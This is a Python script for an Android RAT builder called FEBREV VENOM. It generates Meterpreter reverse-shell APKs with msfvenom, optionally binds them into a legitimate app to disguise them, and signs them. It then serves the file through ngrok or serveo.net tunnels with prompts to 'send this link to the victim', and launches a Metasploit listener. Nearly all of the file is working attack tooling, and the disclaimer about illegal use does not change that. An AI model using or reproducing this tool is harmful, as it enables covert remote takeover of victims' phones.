#!/usr/bin/python3
import os
import webbrowser
import socket
import click
import zenipy
os.system("chmod 777 ngrok")
print("\033[1;31m WELCOME TO FEBREV VENOM")
zenipy.zenipy.message(title="WEOLCOME TO FEBREV_VENOM", text="FEBRV-VENOM is an android exploitation tool developed by FEBIN")
print("""\033[1;34m
  ______ ______ ____  _____  ________      __ __      ________ _   _  ____  __  __ 
 |  ____|  ____|  _ \|  __ \|  ____\ \    / / \ \    / /  ____| \ | |/ __ \|  \/  |
 | |__  | |__  | |_) | |__) | |__   \ \  / /   \ \  / /| |__  |  \| | |  | | \  / |
 |  __| |  __| |  _ <|  _  /|  __|   \ \/ /     \ \/ / |  __| | . ` | |  | | |\/| |
 | |    | |____| |_) | | \ \| |____   \  /       \  /  | |____| |\  | |__| | |  | |
 |_|    |______|____/|_|  \_\______|   \/         \/   |______|_| \_|\____/|_|  |_|
                 Version 2.0                                                                  
                                                                                                                                        
                                                                 
                     =====>>> coded by FEBIN REV                                                                                             
     
 """)
print("\033[1;35m ======================================================programmed by FEBIN")
zenipy.zenipy.message(title="WARNING", text="I am not responsible for any illegal work done by you!!!")
print("\033[1;31m Do Not Use For malicious purposes.....I am not responsible ,for any crime done by you!!")
print(" ")
print("""\033[1;36m  
**********************************************************************|
[1]android/meterpreter/reverse_tcp                                    |
**********************************************************************|
[2]android/meterpreter/reverse_http                                   |
**********************************************************************|
[3]android/meterpreter/reverse_https                                  |
**********************************************************************|
[4]Android payload works over internet(port forwarding using ssh)     |
**********************************************************************|
""")
payload=click.prompt("ENTER THE SERIAL OF THE PAYLOAD YOU WANNA USE (default reverse_tcp): ", type=int, default=1)
print(f"PAYLOAD ==> {payload}")

output=click.prompt("ENTER THE PATH OF YOUR OUTPUT APK (example : /root/Desktop)[default /root/]: ", type=str, default="/root")
print(f"OUTPUT PATH ==> {output}")

name=click.prompt("ENTER THE NAME OF YOUR RAT APK(example: rat.apk)( '.apk' extension is must)[default febrev.apk]: ", type=str, default="febrev.apk"  )
print(f"NAME ==> {name}")

lhost=click.prompt("ENTER YOUR IP ADDRESS(lhost) : ", type=str, default=socket.gethostbyname(socket.gethostname()))
print(f"LHOST ==> {lhost}")

lport=click.prompt("ENTER YOUR LISTENER PORT(lport)[default 6595] : ", type=str, default="6595")
print(f"LPORT ==> {lport}")
def venom():
    if payload==1:
        bind=zenipy.zenipy.question(text="DO YOU WANT TO BIND YOUR APK WITH OTHER APP [Y/n]? : ")
        if bind==True:
            realapp=zenipy.zenipy.file_selection(title="CHOOSE THE ORIGINAL APK : ", directory=False, save=False)
            if os.path.exists(realapp):
                os.system(f"msfvenom -x {realapp} -p android/meterpreter/reverse_tcp -a dalvik --platform=android lhost={lhost} lport={lport} > {output}/{name} ")
                print("SIGNING YOUR APK>>>>>>")
                os.system(f"apksigner sign -key febrev.pk8 -cert febrev.x509.pem {output}/{name}")
                print("D--O--N--E...........!!!!!!")
            else:
                print("ERROR : cannot find the path of the app by FEBREV_VENOM.!!!!!!!!")
                print("failed........!!!!!!!")
        else:
            os.system(f"msfvenom -p android/meterpreter/reverse_tcp -a dalvik --platform=android lhost={lhost} lport={lport} > {output}/{name}")
            print("SIGNING YOUR APK>>>>>>")
            os.system(f"apksigner sign -key febrev.pk8 -cert febrev.x509.pem {output}/{name}")
            print(f"{name} RAT apk CREATED SUCCESSFULLY IN {output} ")   
    elif payload==2:
        bind = zenipy.zenipy.question(text="DO YOU WANT TO BIND YOUR APK WITH OTHER APP [Y/n]? : ")
        if bind == True:
            realapp = zenipy.zenipy.file_selection(title="CHOOSE THE ORIGINAL APK : ", directory=False, save=False)
            if os.path.exists(realapp):
                os.system(f"msfvenom -x {realapp} -p android/meterpreter/reverse_http -a dalvik --platform=android lhost={lhost}  lport={lport} > {output}/{name} ")
                print("SIGNING YOUR APK>>>>>>")
                os.system(f"apksigner sign -key febrev.pk8 -cert febrev.x509.pem {output}/{name}")
                print("D--O--N--E...........!!!!!!")
            else:
                print("ERROR : cannot find the path of the app by FEBREV_VENOM.!!!!!!!!")
                print("failed........!!!!!!!")
        else:
            os.system(f"msfvenom -p android/meterpreter/reverse_http -a dalvik --platform=android lhost={lhost} lport={lport} > {output}/{name}")
            print("SIGNING YOUR APK>>>>>>")
            os.system(f"apksigner sign -key febrev.pk8 -cert febrev.x509.pem {output}/{name}")
            print(f"{name} RAT apk CREATED SUCCESSFULLY IN {output} ")
    elif payload==3:
        bind = zenipy.zenipy.question(text="DO YOU WANT TO BIND YOUR APK WITH OTHER APP [Y/n]? : ")
        if bind == True:
            realapp = zenipy.zenipy.file_selection(title="CHOOSE THE ORIGINAL APK : ", directory=False, save=False)
            if os.path.exists(realapp):
                os.system(f"msfvenom -x {realapp} -p android/meterpreter/reverse_https -a dalvik --platform=android lhost={lhost} lport={lport} > {output}/{name} ")
                print("SIGNING YOUR APK>>>>>>")
                os.system(f"apksigner sign -key febrev.pk8 -cert febrev.x509.pem {output}/{name}")
                print("D--O--N--E...........!!!!!!")
            else:
                print("ERROR : cannot find the path of the app by FEBREV_VENOM.!!!!!!!!")
                print("failed........!!!!!!!")
        else:
            os.system(f"msfvenom -p android/meterpreter/reverse_https -a dalvik --platform=android lhost={lhost} lport={lport} > {output}/{name}")
            print("SIGNING YOUR APK>>>>>>")
            os.system(f"apksigner sign -key febrev.pk8 -cert febrev.x509.pem {output}/{name}")
            print(f"{name} RAT apk CREATED SUCCESSFULLY IN {output} ")
    elif payload==4:
        	malware="android/meterpreter/reverse_tcp"
	        ip=socket.gethostbyname(socket.gethostname())
	        port=lport	
	        serv=socket.gethostbyname("serveo.net")
	        print(f"GENERATING YOUR PAYLOAD APK  --->> {name} ")
	        os.system(f"msfvenom -p {malware} -a dalvik --platform=android lhost={serv} lport={port} > {output}/{name}")
	        print("SIGNING YOUR APK>>>>>>...")
	        print("")
	        os.system(f"apksigner sign -key febrev.pk8 -cert febrev.x509.pem {output}/{name}")
	        print("")
	        print(f"{output}/{name} has been created successfully .......")
	        link1=zenipy.zenipy.question(title="URL", text="DO YOU WANT TO SEND THE PAYLOAD APK via LINK URL [Y/n]? : ")
	        if link1==True:
		             print("C-A-U-T-I-O-N :CLOSING THIS WINDOW COULD STOP PORT FORWARDING AND SERVER..")
		             print("")
		             print("[1] custom domain   [2] default domain")
		             domain=int(input("ENTER YOUR CHOICE : "))
		             if domain==1:
			               dn=input("Enter a name for subdomain :")
			               print("SERVER AND PORT FORWARDING STARTED ctrl+c to STOP")
			               os.system(f"cp {output}/{name} /var/www/html/")
			               os.system("service apache2 start") 
			               print(f"send this link to the victim >>> {dn}.serveo.net/{name}")
			               os.system(f"ssh -R {port}:{ip}:{port} serveo.net -R  {dn}.serveo.net:80:localhost:80")
			               os.system(f"rm -rf /var/www/html/{name}") 
		             else:
			                print(f"using DEFAULT url > https://febrev.serveo.net/{name} <<send this link to victim")
			                os.system(f"cp {output}/{name} /var/www/html/")
			                os.system("service apache2 start") 
			                print("SERVER AND PORT FORWARDING ENABLED.....  Ctrl-C to stop & close")
			                os.system(f"ssh -R {port}:{ip}:{port} serveo.net -R  febrev.serveo.net:80:localhost:80")
			                os.system(f"rm -rf /var/www/html/{name}") 
			                exit()
	        else:
		           print("PORT FORWARDING ENABLED>>>>>>>>>>")
		           print("\033[1;31m C-A-U-T-I-O-N :CLOSING THIS WINDOW COULD STOP PORT FORWARDING , Ctrl-c to stop & close")
		           os.system(f"ssh -R {port}:{ip}:{port} serveo.net")
		           exit()
    
    else:
        print("\033[1;31m  INPUT TYPE ERROR : YOU SHOULD CHOOSE A NUMBER BETWEEN 1 to 4. !!!")
        print("exiting......")
        exit()


    server=zenipy.zenipy.question(title="URL", text="DO YOU WANT TO SEND THE PAYLOAD APK via LINK URL [Y/n]? : ")
    if server==True:
      print("[1]generate link through ngrok")
      print("[2]GENERATE CUSTOM LINK URL VIA SERVEO.NET(the best ever method)")
      link=int(input("ENTER YOUR CHOICE : "))
      if link==1:
            os.system(f"cp {output}/{name} /var/www/html/")
            print("SERVER STARTED......")
            print(f" COPY THE LINK BELOW AND ADD ' /{name}  AND SEND THE LINK URL TO YOUR VICTIM")
            print(f" <link>/{name}  ")
            print(f" FOR EXAMPLE : ===>> https://1234abc45d.ngrok.io/{name}")
            ack=input("do you understand?? : ")
            os.system("service apache2 start")
            ngrok=zenipy.zenipy.question(title="NGROK", text="DO YOU ALREADY HAVE AN ACCOUNT IN ngrok.io [Y/n]? : ")
            if ngrok==False:
                  print(" ##### PLEASE ENTER THE AUTHTOKEN OF YOUR ACCOUNT#####")
                  webbrowser.open("https://dashboard.ngrok.com/signup")
                  auth=zenipy.zenipy.entry(title="ngrok AUTHTOKEN", text=" ENTER THE STRING AUTHTOKEN ALONE(without './ngrok authtoken 'phrase : ")
                  os.system(f"./ngrok authtoken {auth}")
                  os.system("./ngrok http 80")
                  print("#######HAPPY HACKING#############")
            
            else:
               print("NICE , you have an account in ngrok...")
               if os.path.isfile("/root/.ngrok2/ngrok.yml"):
                   print(f"send the ngrok link/{name} and send to the victim..!!")
                   print(f" FOR EXAMPLE : ===>> https://1234abc45d.ngrok.io/{name}")
                   os.system("./ngrok http 80")
                   print("#######HAPPY HACKING#############")
               else:
                   print("YOUR SYSTEM IS NOT CONFIGURED NGROK PROPERLY...")
                   print("PLEASE LOGIN YOUR NGROK ACCOUNT AND COPY THE AUTHTOKEN ALONE :")
                   input("ENTER TO CONTINUE , LOGIN :")
                   webbrowser.open("https://dashboard.ngrok.com/login")
                   auth2=input("ENTER THE AUTHTOKEN STRING ALONE : ")
                   os.system(f"./ngrok authtoken {auth2}")
                   input(f"send the ngrok link/{name} and send to the victim..!!('enter to continue!)")
                   input(f" FOR EXAMPLE : ===>> https://1234abc45d.ngrok.io/{name}(enter to continue)")
                   os.system("./ngrok http 80")
                   print("#######HAPPY HACKING#############")
      elif link==2:
           os.system(f"cp {output}/{name} /var/www/html/")
           print("[1] DEFAULT URL (https://frvenom.serveo.net)")
           print("[2] MAKE YOUR OWN CUSTOM DOMAIN NAME(eg:https://yourname.serveo.net)")
           serveo=int(input("Enter the choice: "))
           if serveo==1:
              print("SEND THE BELOW URL TO THE VICTIM....>>")
              print(f"https://frvenom.serveo.net/{name}")
              print("SERVER STARTED.......")
              os.system("ssh -R frvenom.serveo.net:80:localhost:80 serveo.net")
              print("#######HAPPY HACKING#############")
           elif serveo==2:
                domain=input("ENTER ANY NAME OF YOUR CHOICE : ")
                print(f"send this URL to the victim >>>> https://{domain}.serveo.net/{name}  ")
                print("SERVER STARTED.......")
                os.system(f"ssh -R {domain}.serveo.net:80:localhost:80 serveo.net")
                print("#######HAPPY HACKING#############")
           else:
               print("USING DEFAULT URL...")
               print(f"SEND THIS URL TO THE VICTIM >>>>> https://frvenom.serveo.net/{name}")
               os.system("ssh -R frvenom.serveo.net:80:localhost:80 serveo.net")
               print("#######HAPPY HACKING#############")
      else:
           os.system(f"cp {output}/{name} /var/www/html/")
           print("NO INPUT ENTERED BY USER,,,,,,USING DEFAULT URL....")
           print("SEND THE BELOW URL TO THE VICTIM....>>")
           print(f"https://frvenom.serveo.net/{name}")
           print("SERVER STARTED.......")
           os.system("ssh -R frvenom.serveo.net:80:localhost:80 serveo.net")
           
    elif server=="n" or server=="N":
        exiting=input("ANY KEY TO EXIT....")
        print("##########  HAPPY HACKING ###########")
    else:
         print("#########HAPPY HACKING###############")
    
    os.system(f"rm /var/www/html/{name}")
    msf=zenipy.zenipy.question(title="METASPLOIT LISTENER", text="DO YOU WANT TO START MSF LISTENER NOW [Y/n]? : ")
    if msf==True:
         msfp=input("ENTER THE NAME OF THE PAYLOAD YOU WANNA LISTEN : ")
         print("STARTING METASPLOIT METERPRETER FOR YOUR PAYLOAD....")
         os.system("service postgresql start")
         lip=socket.gethostbyname(socket.gethostname())
         os.system(f"msfconsole -x 'use multi/handler; set LHOST {lip}; set LPORT {lport}; set PAYLOAD {msfp}; exploit'")
    else:
         print("EXITING.....BYE BYE>>>>")
         os.system("exit")
              
    
    

if __name__=="__main__":
    venom()
    
